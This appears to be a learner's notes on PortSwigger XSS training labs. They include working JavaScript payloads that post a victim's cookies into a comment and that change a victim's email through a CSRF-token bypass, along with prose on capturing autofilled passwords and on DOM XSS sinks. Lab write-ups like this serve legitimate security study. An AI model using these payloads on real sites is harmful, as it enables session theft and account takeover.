
## Exploiting cross-site scripting to steal cookies
```js
<script>
    window.addEventListener("DOMContentLoaded", function () {
      var token = document.getElementsByName("csrf")[0].value;
    
      var data = new FormData();
      data.append("csrf", token);
      data.append("postId", 1);
      data.append("comment", document.cookie);
      data.append("name", "Victim");
      data.append("email", "victim@gmail.com");
      data.append("website", "https://www.victim.com");
    
        console.log(data);

      fetch('/post/comment', {
        method: "POST",
        mode: "no-cors",
        body: data,
      })
        .then(() => {
          confirm("the script was fullfilled successfully!");
        })
        .catch(() => {
          alert("the script was not sucessfull");
        });
        console.log(data);
    });


</script>
```

Learnt Lessons

 that was super hard due to multiple reasons
 - URL encoding
 - not making sure the form requirements were met
 - didn't know I could check the console while doing the lab
 - I need to learn the debugging and check if the debugger will walk me through the script that is now shown in the window
 - not knowing how the params are written for the fetch 
 - not knowing if to write the fill or short URL in the fetch !!!
 - need to try it with the full URL


## Lab: Exploiting cross-site scripting to capture passwords

- This lab's target is to show the vulnerability of using autofilling for user names and passwords
- a script is injected into the already vulnerable comment section
- this code injects a user name and password input sections 
- as soon as the browser sees the user name and password attribute, it autofills them
- as then as soon as the browser fills the data, the scripts senses this using the "on change attribute" and sends these data to the malicious server.

## Lab: Exploiting XSS to bypass CSRF defenses
<a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">link</a>


```js
//@ts-check

<script>
    window.addEventListener("DOMContentLoaded", () => {
        let fullData = new FormData();
        let token = document.getElementsByName("csrf")[0].value;
        fullData.append("csrf", token);
        fullData.append("email", "mina2@gmail.com");
        fetch("/my-account/change-email", {
            method: "POST",
            body: fullData,
            mode: "no-cors",
        })
            .then(() => {
                console.log("OK");
            })
            .catch(() => {
                console.log("NOK");
            });
        console.log("FullData is as shown: ");
        console.log(fullData);
    });
</script>
```

Trial 1:
- tired getting the user to post the cookie session and the CSRF in a comment and then manipulate the parameters of the request to tell the server I am the other user, but it didn't work because the cookie was not getting posted in the comment but some other gibberish
Trial 2:
- tried letting the user himself make the request as I don't have the cookie session and he has it.
- so his browser will make the request and use its correct cookie session.
- so I only got the CSRF and posted it in the request that the user will make.

## Lab: Reflected DOM XSS
<a src="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected">lab link</a>

this lab was hard due to not understanding JSON encoding
- the main vulnerability is using the eval function
- because the eval function just evaluates the string inside it without checking if it is a proper json object
- if it was a proper JSON.parse then this would not work because it would find the alert is ruining the object

## Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

<a src = "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">lab link </a>

this lab was hard because :
1. I thought the script tag can be used anywhere in the html page
	- but it could be used only if outside of other tags
	- the tag I was inside needs to be closed first
	- I couldn't understand the html page 
	- i forgot the selected attribute from the options tag
	- overall more html needs to be studied


## Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

this was hard because I didn't know you could use a javscript attribute inside other HTML tags
- normally this is not advertised in any course because it is bad practice
- because this raises a "serparation of concerns flag" as it would result in a single document having javascript, HTML ,.... so it's considered bad practise but it is very usefull for us to know